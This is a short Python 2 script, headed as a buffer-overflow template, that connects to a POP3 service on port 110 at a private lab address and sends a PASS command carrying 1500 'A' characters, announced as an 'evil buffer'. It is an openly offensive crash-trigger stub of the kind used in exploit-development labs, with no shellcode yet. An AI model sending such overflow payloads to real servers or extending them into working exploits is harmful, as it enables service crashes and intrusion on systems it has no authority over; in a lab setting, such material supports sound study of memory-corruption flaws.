import struct
import socket

print "\n\n###############"
print "Template for BO"
print "###############"

target = "192.168.56.102"
port = '110'

buffer = "A" * 1500
try:
	print "\nSending evil buffer..."
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.56.102', 110))
	data=s.recv(1024)
	s.send('USER username' + '\r\n')
	data=s.recv(1024)
	s.send('PASS' + buffer + '\r\n')
	data=s.recv(1024)
	s.close()
	print "DONE!"
except:
	print "Could not connect"
